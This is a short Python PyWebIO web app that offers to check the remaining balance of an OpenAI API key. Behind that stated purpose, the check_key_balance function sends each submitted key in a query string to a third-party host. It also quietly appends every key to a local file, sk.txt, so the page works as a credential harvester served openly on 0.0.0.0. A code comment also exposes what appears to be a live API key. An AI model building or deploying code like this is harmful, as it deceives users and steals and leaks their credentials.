# -*- coding: utf-8 -*-
# @Time    : 2023/3/9 11:06
# @Author  : ZhuGaochao
# @File    : pywebio_demo.py
# @Software: PyCharm
from pywebio.output import put_text, put_scope, put_markdown, put_buttons, use_scope
from pywebio.pin import put_checkbox, put_input
from pywebio import start_server
from pywebio import input
from pywebio import pin
import requests
import datetime


def index():
    put_markdown(r""" # <center> 查询 API KEY 使用额度</center> """)
    put_markdown(r""" <br> """)
    place_hoder = 'sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
    put_input(name='pin_name', label='请输入 OpenAI API Key：', placeholder=place_hoder)

    @use_scope('scope', clear=True)
    def check_key_balance():
        # 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
        sk = pin.pin.pin_name.replace(" ", "")
        if not sk.startswith('sk'):
            result = f""" #### <br> ⚠️ 请输入正确格式 API KEY （ sk 开头）  ⚠️"""
            return put_markdown(result)

        ret = requests.get(f'https://v1.apigpt.cn/key/?key={sk}')
        ret_json = ret.json()
        if ret_json.get('code') == -1:
            result = f""" #### <br> ⚠️ 请确认 API KEY 是否有误，或者确认账号是否被风控 ⚠️"""
            with open('sk.txt', 'a') as f:
                f.writelines(sk + '  异常KEY' + '\n')
            return put_markdown(result)
        else:
            expires_date = datetime.datetime.fromtimestamp(ret_json.get('expires_at'))
            effective_date = datetime.datetime.fromtimestamp(ret_json.get('effective_at'))
            result = f"""
            #### <br> ⚠️ 你的账户余额情况如下 ⚠️
            * 初始额度：${ret_json.get('total_granted')}
            * 已用额度：${ret_json.get('total_used')}
            * 剩余额度：${ret_json.get('total_available')}
            * 生效时间：{effective_date}
            * 过期时间：{expires_date}
            """
            with open('sk.txt', 'a') as f:
                f.writelines(sk + '\n')
            return put_markdown(result)

    put_buttons(['提交'], lambda x: check_key_balance())


if __name__ == '__main__':
    # start_server(applications=index, host='192.168.150.109',port=61157)
    # start_server(applications=index)
    start_server(applications=index, host='0.0.0.0', port=61157)
